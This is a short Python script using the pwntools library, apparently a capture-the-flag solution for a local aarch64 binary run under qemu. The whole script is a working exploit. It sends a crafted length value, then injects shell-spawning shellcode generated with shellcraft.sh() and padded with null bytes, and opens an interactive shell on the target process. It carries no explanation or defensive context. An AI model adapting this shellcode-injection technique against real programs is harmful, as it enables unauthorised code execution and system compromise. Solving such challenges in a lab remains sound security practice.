from pwn import *
import sys, time


if __name__ == "__main__":
    p = process("qemu-aarch64-static -L /usr/aarch64-linux-gnu/ ./ty-b83f0d0edeb8cfad76d30eddc58da139".split(" "))
    context.binary = "./ty-b83f0d0edeb8cfad76d30eddc58da139"
    p.send("100" + "A" * 5)
    p.send(asm(shellcraft.sh()).ljust(100, "\x00"))
    p.send("\x00" * 100)
    p.interactive()
